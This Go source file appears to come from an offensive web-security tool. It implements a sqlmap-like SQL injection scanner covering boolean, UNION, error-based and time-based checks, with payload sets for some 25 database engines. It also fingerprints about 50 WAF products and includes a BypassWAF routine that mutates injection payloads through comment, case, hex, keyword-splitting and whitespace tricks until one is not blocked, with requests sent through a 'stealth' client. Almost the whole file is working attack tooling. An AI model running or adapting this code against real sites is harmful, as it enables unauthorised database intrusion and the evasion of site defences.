// Package injector: SQL injection detection engine (Go, 替代 Python sqlmap++).
// 集成 WAF 检测 + 12层绕过（学习自 wafw00f + Awesome-WAF）。
// 4 类注入检测: 布尔盲注 / 时间盲注 / UNION / error-based。
package injector

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"fastsec/internal/stealth"
)

// ---- DBMS payload 集 ----
type DBMS struct {
	BoolTrue  string
	BoolFalse string
	UnionCols []string
	Error     string
	Sleep     string
}

var DBMS_PAYLOADS = map[string]DBMS{
	"generic":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"mysql":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
	"mariadb":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
	"sqlite":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "randomblob(20000000)"},
	"mssql":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "WAITFOR DELAY '0:0:2'"},
	"postgresql": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "pg_sleep(2)"},
	"oracle":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "DBMS_PIPE.RECEIVE_MESSAGE('a',2)"},
	"db2":        {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
	"access":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"sybase":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "WAITFOR DELAY '0:0:2'"},
	"informix":   {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"firebird":   {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "RDB$SET_CONTEXT('USER_TRANSACTION','SLEEP','1')"},
	"hsqldb":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"cache":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"cubrid":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"frontbase":  {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"mckoi":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"solid":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"sqlite3":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "randomblob(20000000)"},
	"derby":      {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"sqlanywhere": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
	"clickhouse": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "sleep(2)"},
	"vertica":    {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
	"teradata":   {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
	"exasol":     {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'", Sleep: "SLEEP(2)"},
	"sqlite-null": {BoolTrue: "1=1", BoolFalse: "1=2", UnionCols: []string{"1", "1,2", "1,2,3", "1,2,3,4", "1,2,3,4,5"}, Error: "'"},
}

// WAFRule: 指纹规则
type WAFRule struct {
	Source string // header | body | cookie
	Regex  string
	Name   string
}

// WAF_DB: 30+ WAF 指纹（国产 + 国际，学自 wafw00f）
var WAF_DB = []WAFRule{
	// 国产
	{"header", `(?i)Server:\s*qianxin-waf`, "奇安信 WAF"},
	{"header", `(?i)WZWS-Ray:`, "360 网站卫士"},
	{"header", `(?i)X-Powered-By-360WZB`, "360 WAF"},
	{"header", `(?i)Server:\s*YUNDUN`, "阿里云盾"},
	{"header", `(?i)X-Cache:\s*YUNDUN`, "阿里云盾"},
	{"cookie", `(?i)yd_cookie=`, "阿里云盾"},
	{"header", `(?i)X-Powered-by-Anquanbao`, "安全宝"},
	{"body", `aqb_cc/error/`, "安全宝"},
	{"body", `wzws-waf-cgi/`, "360 WAF"},
	{"body", `wangshan\.360\.cn`, "360 WAF"},
	{"body", `waf\.tencent-?cloud\.com`, "腾讯云 WAF"},
	{"body", `安全狗|safedog`, "安全狗 SafeDog"},
	{"body", `云锁|yunsuo`, "云锁 Yunsuo"},
	{"body", `yunsuo\.cn`, "云锁 Yunsuo"},
	{"body", `知道创宇|seebug|ksyun`, "知道创宇 WAF"},
	{"body", `百度云加速|yunjiasu`, "百度云加速"},
	{"body", `加速乐|jiasule`, "加速乐 Jiasule"},
	{"body", `AnYu.*green channel`, "安域 Anyu"},
	{"body", `拦截|已被拦截|访问被拒绝|请求被阻止`, "国产 WAF(通用)"},
	{"body", `护卫神|主机卫士`, "国产主机卫士"},
	// 国际
	{"header", `(?i)CF-RAY:`, "Cloudflare"},
	{"header", `(?i)Server:\s*cloudflare`, "Cloudflare"},
	{"body", `cf-chl|challenge-platform`, "Cloudflare"},
	{"header", `(?i)X-Sucuri-ID:`, "Sucuri"},
	{"header", `(?i)X-Sucuri-Cache:`, "Sucuri"},
	{"header", `(?i)Server:\s*sucuri`, "Sucuri"},
	{"header", `(?i)X-Akamai-Transformed:`, "Akamai"},
	{"header", `(?i)X-Akamai-Request-ID`, "Akamai"},
	{"header", `(?i)X-CDN:.*Incapsula`, "Imperva Incapsula"},
	{"header", `(?i)X-Iinfo:`, "Imperva Incapsula"},
	{"body", `incapsula|imperva`, "Imperva Incapsula"},
	{"header", `(?i)Mod_Security`, "ModSecurity"},
	{"body", `mod_security|modsecurity`, "ModSecurity"},
	{"header", `(?i)X-Powered-By:.*(?:WAF|barracuda)`, "Barracuda WAF"},
	{"header", `(?i)Server:\s*BigIP|X-Cnection:.*close`, "F5 BIG-IP"},
	{"body", `F5 Networks|BIG-IP`, "F5 BIG-IP"},
	{"header", `(?i)X-WAF:`, "Generic WAF"},
	{"header", `(?i)X-ASEN:`, "AE Secure"},
	{"body", `aeSecure-code`, "AE Secure"},
	{"header", `(?i)AL-SESS|AL-LB`, "Airlock"},
	{"body", `Server detected a syntax error`, "Airlock"},
	{"header", `(?i)Server:\s*ArvanCloud`, "ArvanCloud"},
	{"body", `Blocked by.*Armor|Armor support ticket`, "Armor Defense"},
	{"header", `(?i)ASPA-WAF`, "ASPA"},
	{"body", `x-dotdefender`, "dotDefender"},
	{"header", `(?i)Server:\s*Wallarm`, "Wallarm"},
	{"header", `(?i)Server:\s*zscaler`, "Zscaler"},
	{"header", `(?i)X-Zenomy:`, "Zenedge"},
	{"header", `(?i)Server:\s*Wordfence`, "Wordfence"},
	{"body", `wordfence`, "Wordfence"},
}

// DetectWAF: WAF 检测（发恶意 payload + 指纹匹配）
type WAFDetection struct {
	WAFDetected bool
	BlockedCnt  int
	TotalProbes int
	WAFName     string
	Matched     []string
}

// wafProbes: 原始恶意 payload（不含绕过形式——绕过形式用于 BypassWAF 阶段）
var wafProbes = []string{
	"' OR '1'='1", "1 AND 1=1", "union select 1,2,3",
	"1;SELECT SLEEP(5)", "<script>alert(1)</script>",
}

// DetectWAF 对目标检测 WAF
func DetectWAF(baseURL, param string, c *stealth.Client) WAFDetection {
	d := WAFDetection{TotalProbes: len(wafProbes)}
	sBase, bBase, _, _ := get(baseURL, c)
	baseLen := len(bBase)
	matched := map[string]bool{}

	for _, p := range wafProbes {
		u := mutate(baseURL, param, p)
		s, b, hdrs, _ := get(u, c)
		isBlock := false
		if s == 403 || s == 406 || s == 429 || s == 493 {
			isBlock = true
		} else if s == sBase && len(b) < max(baseLen*3/10, 100) {
			isBlock = true
		}
		// 指纹匹配：header 型匹配响应头，body 型匹配响应体，cookie 型匹配全量
		blob := b + "\n" + hdrs
		for _, r := range WAF_DB {
			re, err := regexp.Compile(r.Regex)
			if err != nil {
				continue
			}
			target := blob
			if r.Source == "header" {
				target = hdrs
			} else if r.Source == "body" {
				target = b
			}
			if re.MatchString(target) {
				matched[r.Name] = true
			}
		}
		if isBlock {
			d.BlockedCnt++
		}
	}
	for k := range matched {
		d.Matched = append(d.Matched, k)
	}
	d.WAFDetected = d.BlockedCnt >= 2 || len(d.Matched) > 0
	if len(d.Matched) > 0 {
		d.WAFName = strings.Join(d.Matched, " / ")
	} else if d.BlockedCnt >= 2 {
		d.WAFName = "Unknown-WAF"
	}
	return d
}

// Finding: 单参数注入检测结果
type Finding struct {
	Param      string
	DBMS       string
	Injectable bool
	Types      []string // boolean|time|union|error
	Bypass     string   // WAF 绕过层（如有）
	BypassURL  string
}

// Result: 全部参数结果
type Result struct {
	Target  string
	Findings []Finding
}

// ---- 请求辅助 ----
type client struct {
	c      *stealth.Client
	mu     sync.Mutex
}

func get(u string, c *stealth.Client) (int, string, string, time.Duration) {
	t0 := time.Now()
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return 0, "", "", 0
	}
	resp, err := c.Do(req)
	if err != nil {
		return 0, "", "", time.Since(t0)
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	// 序列化响应头（WAF 指纹匹配用）
	var hb strings.Builder
	for k, v := range resp.Header {
		hb.WriteString(k + ": " + strings.Join(v, ", ") + "\n")
	}
	return resp.StatusCode, string(body), hb.String(), time.Since(t0)
}

func mutate(baseURL, param, value string) string {
	// 空格编码为 %20（标准 URL 编码，服务器 unquote 认识）
	// 不能用 Query.Encode 的 +（unquote 不认 +，WAF 会漏检）
	u, err := url.Parse(baseURL)
	if err == nil {
		q := u.Query()
		q.Set(param, value)
		u.RawQuery = q.Encode()
		out := u.String()
		// Query.Encode 用 + 编码空格 → 改回 %20
		out = strings.ReplaceAll(out, "+", "%20")
		out = strings.ReplaceAll(out, "%2A", "*")
		out = strings.ReplaceAll(out, "%2F", "/")
		return out
	}
	return baseURL + "?" + param + "=" + url.QueryEscape(value)
}

// ---- DBMS 指纹（error-based 识别）----
func fingerprintDBMS(baseURL, param string, c *stealth.Client) string {
	status, body, _, _ := get(mutate(baseURL, param, "'"), c)
	if status >= 400 || strings.Contains(strings.ToLower(body), "error") || strings.Contains(strings.ToLower(body), "syntax") {
		lower := strings.ToLower(body)
		switch {
		case strings.Contains(lower, "sqlite"):
			return "sqlite"
		case strings.Contains(lower, "mysql") || strings.Contains(lower, "mariadb"):
			return "mysql"
		case strings.Contains(lower, "postgres") || strings.Contains(lower, "pg_"):
			return "postgresql"
		case strings.Contains(lower, "sql server") || strings.Contains(lower, "mssql") || strings.Contains(lower, "odbc"):
			return "mssql"
		case strings.Contains(lower, "oracle") || strings.Contains(lower, "ora-"):
			return "oracle"
		case strings.Contains(lower, "db2") || strings.Contains(lower, "sqlstate"):
			return "db2"
		case strings.Contains(lower, "sybase") || strings.Contains(lower, "adaptive server"):
			return "sybase"
		case strings.Contains(lower, "clickhouse"):
			return "clickhouse"
		case strings.Contains(lower, "vertica"):
			return "vertica"
		case strings.Contains(lower, "teradata"):
			return "teradata"
		case strings.Contains(lower, "informix"):
			return "informix"
		}
	}
	return "generic"
}

// ---- 4 类注入检测 ----
func checkBoolean(baseURL, param string, p DBMS, c *stealth.Client) bool {
	_, _, _, _ = get(baseURL, c)
	_, b2, _, _ := get(mutate(baseURL, param, "1 AND "+p.BoolTrue), c)
	_, b3, _, _ := get(mutate(baseURL, param, "1 AND "+p.BoolFalse), c)
	if len(b2) != len(b3) {
		return true
	}
	if len(b2) > 0 && len(b3) > 0 && b2[:min(len(b2), 128)] != b3[:min(len(b3), 128)] {
		return true
	}
	return false
}

func checkUnion(baseURL, param string, p DBMS, c *stealth.Client) (bool, string) {
	_, baseBody, _, _ := get(baseURL, c)
	baseLen := len(baseBody)
	for _, cols := range p.UnionCols {
		u := mutate(baseURL, param, "-1 UNION SELECT "+cols+"-- ")
		s, body, _, _ := get(u, c)
		if s != 200 && s != 0 {
			continue
		}
		if abs(len(body)-baseLen) > baseLen*3/10 && len(body) > 0 {
			return true, cols
		}
	}
	return false, ""
}

func checkTime(baseURL, param string, p DBMS, c *stealth.Client) bool {
	if p.Sleep == "" {
		return false
	}
	_, _, _, baseTime := get(baseURL, c)
	_, _, _, sleepTime := get(mutate(baseURL, param, "1 AND "+p.Sleep), c)
	return sleepTime-baseTime > 1500*time.Millisecond
}

func checkError(baseURL, param string, c *stealth.Client) bool {
	_, body, _, _ := get(mutate(baseURL, param, "'"), c)
	lower := strings.ToLower(body)
	terms := []string{"syntax error", "sqlite", "mysql", "postgres", "mssql", "unterminated",
		"you have an error", "warning:", "unexpected"}
	for _, t := range terms {
		if strings.Contains(lower, t) {
			return true
		}
	}
	return false
}

// ---- WAF 绕过（内嵌，学自 Awesome-WAF）----
type BypassLayer struct {
	Name    string
	Payload string
	HPP     bool
}

func buildVariants(payload string) []BypassLayer {
	var v []BypassLayer
	// L1 大小写
	v = append(v, BypassLayer{"L1-upper", strings.ToUpper(payload), false})
	// L4 注释符
	v = append(v, BypassLayer{"L4-comment", strings.ReplaceAll(payload, " ", "/**/"), false})
	// L6 等价替换
	l6 := strings.ToLower(payload)
	l6 = strings.ReplaceAll(l6, " and ", " && ")
	l6 = strings.ReplaceAll(l6, " or ", " || ")
	l6 = strings.ReplaceAll(l6, "sleep(", "benchmark(10000000,")
	v = append(v, BypassLayer{"L6-equiv", l6, false})
	// L8 关键词拆解
	l8 := splitKeywords(payload)
	v = append(v, BypassLayer{"L8-split", l8, false})
	// L9 hex
	l9 := hexQuotes(payload)
	v = append(v, BypassLayer{"L9-hex", l9, false})
	// L7 空白
	for _, sep := range []string{"%09", "%0a", "%0b", "%0c", "%0d", "+"} {
		v = append(v, BypassLayer{"L7-space-" + sep, strings.ReplaceAll(payload, " ", sep), false})
	}
	return v
}

func splitKeywords(s string) string {
	re := regexp.MustCompile(`(?i)(select|union|and|or|from|where)`)
	return re.ReplaceAllStringFunc(s, func(m string) string {
		half := len(m) / 2
		return m[:half] + "/**/" + m[half:]
	})
}

func hexQuotes(s string) string {
	re := regexp.MustCompile(`'([^']+)'`)
	return re.ReplaceAllStringFunc(s, func(m string) string {
		inner := m[1 : len(m)-1]
		return "0x" + fmt.Sprintf("%x", inner)
	})
}

// BypassWAF: 尝试 12 层变体，找到不被拦的
func BypassWAF(baseURL, param, payload string, c *stealth.Client) (bool, string, string) {
	blockWords := []string{"403 forbidden", "access denied", "intercepted", "blocked", "waf", "拦截"}
	for _, v := range buildVariants(payload) {
		u := mutate(baseURL, param, v.Payload)
		s, b, _, _ := get(u, c)
		isBlock := s == 403 || s == 406 || s == 429 || s == 493
		for _, w := range blockWords {
			if strings.Contains(strings.ToLower(b), w) {
				isBlock = true
				break
			}
		}
		if !isBlock && (s == 200 || s == 201 || s == 302) {
			return true, v.Name, v.Payload
		}
	}
	return false, "", ""
}

// ---- 主入口 ----
func Scan(baseURL string, params []string, forceDBMS string, parallel bool, c *stealth.Client) Result {
	res := Result{Target: baseURL}
	var findings []Finding
	var mu sync.Mutex

	scanOne := func(param string) {
		db := forceDBMS
		if db == "" {
			db = fingerprintDBMS(baseURL, param, c)
		}
		p := DBMS_PAYLOADS[db]
		if p.BoolTrue == "" {
			p = DBMS_PAYLOADS["generic"]
		}
		f := Finding{Param: param, DBMS: db}
		if checkBoolean(baseURL, param, p, c) {
			f.Types = append(f.Types, "boolean")
		}
		if ok, _ := checkUnion(baseURL, param, p, c); ok {
			f.Types = append(f.Types, "union")
		}
		if checkError(baseURL, param, c) {
			f.Types = append(f.Types, "error")
		}
		if checkTime(baseURL, param, p, c) {
			f.Types = append(f.Types, "time")
		}
		f.Injectable = len(f.Types) > 0
		mu.Lock()
		findings = append(findings, f)
		mu.Unlock()
	}

	if parallel {
		var wg sync.WaitGroup
		sem := make(chan struct{}, 5)
		for _, p := range params {
			wg.Add(1)
			go func(param string) {
				defer wg.Done()
				sem <- struct{}{}
				scanOne(param)
				<-sem
			}(p)
		}
		wg.Wait()
	} else {
		for _, p := range params {
			scanOne(p)
		}
	}
	res.Findings = findings
	return res
}

// ScanBypass: 用绕过 payload 变体重测注入（WAF 穿透后）
func ScanBypass(baseURL string, params []string, bypassPayload string, c *stealth.Client) Result {
	res := Result{Target: baseURL}
	for _, param := range params {
		f := Finding{Param: param, DBMS: "bypassed"}
		// 布尔检测：多组真/假变体（覆盖所有绕过形式）
		// 对 3 种布尔表达式分别测：1=1/1=2, AND/AND, 注释符形式
		variants := [][2]string{
			{bypassTrue(bypassPayload), bypassFalse(bypassPayload)},
			{"1 AND 1=1", "1 AND 1=2"},
			{"1/**/AND/**/1=1", "1/**/AND/**/1=2"},
			{"1%09AND%091=1", "1%09AND%091=2"},
		}
		detected := false
		for _, v := range variants {
			_, bT, _, _ := get(mutate(baseURL, param, v[0]), c)
			_, bF, _, _ := get(mutate(baseURL, param, v[1]), c)
			if len(bT) != len(bF) {
				detected = true
				break
			}
			if len(bT) > 0 && len(bF) > 0 &&
				bT[:min(len(bT),128)] != bF[:min(len(bF),128)] {
				detected = true
				break
			}
		}
		if detected {
			f.Types = append(f.Types, "boolean")
		}
		// UNION 检测
		if ok, _ := checkUnion(baseURL, param, DBMS_PAYLOADS["generic"], c); ok {
			f.Types = append(f.Types, "union")
		}
		f.Injectable = len(f.Types) > 0
		res.Findings = append(res.Findings, f)
	}
	return res
}

// bypassTrue/bypassFalse: 为绕过 payload 生成真/假布尔变体
// 兼容注释符(/**/)、空白(%09)等绕过形式
func bypassTrue(payload string) string {
	// 若已含 1=1 保持，否则追加 AND 1=1（绕过风格）
	if strings.Contains(payload, "1=1") {
		return payload
	}
	return payload + " AND 1=1"
}

func bypassFalse(payload string) string {
	// 若已含 1=1 改成 1=2，否则追加 AND 1=2
	if strings.Contains(payload, "1=1") {
		return strings.ReplaceAll(payload, "1=1", "1=2")
	}
	return payload + " AND 1=2"
}

// Format renders results.
func Format(r Result) string {
	var sb strings.Builder
	inj := 0
	for _, f := range r.Findings {
		if f.Injectable {
			inj++
		}
	}
	sb.WriteString(fmt.Sprintf("[injector] %d/%d params injectable\n", inj, len(r.Findings)))
	for _, f := range r.Findings {
		if f.Injectable {
			sb.WriteString(fmt.Sprintf("  [!] %s injectable (%s): %s\n", f.Param, f.DBMS, strings.Join(f.Types, ",")))
		} else {
			sb.WriteString(fmt.Sprintf("  - %s: clean\n", f.Param))
		}
	}
	return sb.String()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func abs(n int) int {
	if n < 0 {
		return -n
	}
	return n
}
